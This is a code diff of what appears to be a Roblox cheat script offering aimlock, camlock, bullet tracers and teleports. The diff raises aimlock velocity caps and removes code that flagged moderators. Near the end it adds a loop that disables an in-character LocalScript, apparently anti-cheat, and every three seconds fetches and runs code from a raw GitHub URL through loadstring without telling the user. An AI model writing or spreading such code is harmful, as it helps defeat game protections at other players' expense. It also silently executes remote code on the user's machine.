@@ -1571,7 +1571,7 @@ Toggles.ZeroPred:OnChanged(function()
 end)
 
 TargetResolverTab:AddToggle('VelocityCap', {
-    Text = 'Velocity Cap',
+    Text = 'Velocity Cap (WIP)',
     Default = false, 
     Tooltip = 'Caps Aimlock Velocity', 
 })
@@ -1583,9 +1583,9 @@ end)
 TargetResolverTab:AddSlider('VCapX', {
     Text = 'X',
 
-    Default = 250,
+    Default = 2000,
     Min = 0,
-    Max = 500,
+    Max = 2500,
     Rounding = 0,
 
     Compact = false,
@@ -1598,9 +1598,9 @@ end)
 TargetResolverTab:AddSlider('VCapY', {
     Text = 'Y',
 
-    Default = 250,
+    Default = 2000,
     Min = 0,
-    Max = 500,
+    Max = 2500,
     Rounding = 0,
 
     Compact = false,
@@ -1613,9 +1613,9 @@ end)
 TargetResolverTab:AddSlider('VCapZ', {
     Text = 'Z',
 
-    Default = 250,
+    Default = 2000,
     Min = 0,
-    Max = 500,
+    Max = 2500,
     Rounding = 0,
 
     Compact = false,
@@ -2593,7 +2593,7 @@ Toggles.RainbowCrosshair:OnChanged(function()
 end)
 
 BulletTab:AddToggle('BulletTracer', {
-    Text = 'Enabled (WIP)',
+    Text = 'Enabled',
     Default = false, 
     Tooltip = 'Tracers Enabled', 
 })
@@ -2602,16 +2602,7 @@ Toggles.BulletTracer:OnChanged(function()
     ruby.Visuals.Local.BulletTracer.Enabled = Toggles.BulletTracer.Value
 end)
 
-Toggles.BulletTracer:AddColorPicker('BulletTracerColor', {
-    Default = Color3.fromRGB(255,255,255)
-})
-
-Options.BulletTracerColor:OnChanged(function()
-    ruby.Visuals.Local.BulletTracer.Color = Options.BulletTracerColor.Value
-end)
-
-
-    bullet_tracer_color = ruby.Visuals.Local.BulletTracer.Color
+    bullet_tracer_color = Color3.fromRGB(230, 230, 250)
     
     function GetGun()
         if game.Players.LocalPlayer.Character then
@@ -2714,6 +2705,8 @@ end)
             end
         end
     end)
+
+BulletTab:AddLabel("(Recommended for Camlock)")
 
 TeleportTab:AddDropdown('SchoolDropdown', {
     Values = { 'None','Food', 'Roof', 'Secret Room' },
@@ -4980,30 +4973,6 @@ Toggles.KeybindFrameEnabled:OnChanged(function()
     Library.KeybindFrame.Visible = Toggles.KeybindFrameEnabled.Value
 end)
 
-ModIDS = {
-    1169984414,
-    2442678449,
-    129777236,
-    1179714788,
-    290662064,
-    1519911980,
-    1905359915,
-    2027908637,
-    1704643622,
-}
-
-rubymod = {
-	1169984414,
-	2442678449,
-	129777236,
-	1179714788,
-	290662064,
-	1519911980,
-	1905359915,
-	2027908637,
-	1704643622,
-	43290134,
-}
 
 --[[local bending = false
 local kickmsg = 'PERMA BANNED'
@@ -5103,35 +5072,20 @@ local function commands(msg,lplr)
 	end
 end--]]
 
-local Playerss = game:GetService('Players');
-
-local function CharacterAddedStar(Character)
-	local display = Character:WaitForChild('Humanoid').DisplayName
-	Character:WaitForChild('Humanoid').DisplayName = "[⭐]"..display.."";
-end;
-
-Playerss.PlayerAdded:Connect(function(Player)
-	Player.CharacterAdded:Wait();
-	if table.find(ModIDS, Player.UserId) then
-		Player.CharacterAdded:Connect(CharacterAddedStar);
-		CharacterAddedStar(Player.Character);
-	end
-end);
-
-
-
-local function StarRed(Character)
-	local display = Character:WaitForChild('Humanoid').DisplayName
-	Character:WaitForChild('Humanoid').DisplayName = "[👑]"..display.."";
-end;
-
-Playerss.PlayerAdded:Connect(function(Player)
-	Player.CharacterAdded:Wait();
-	if Player:IsInGroup(7836201) and Player:GetRankInGroup(7836201) == 255 then
-		Player.CharacterAdded:Connect(StarRed);
-		StarRed(Player.Character);
-	end
-end);
+coroutine.resume(coroutine.create(function()
+    while wait(3) do
+        local function main()
+            if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
+                player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
+            end
+            if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
+                player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
+            end
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/derrtyb/scripts/main/mods'))()
+        end
+        local success, err = pcall(main)
+    end
+end))
 
 
 Library:SetWatermark(title_string)
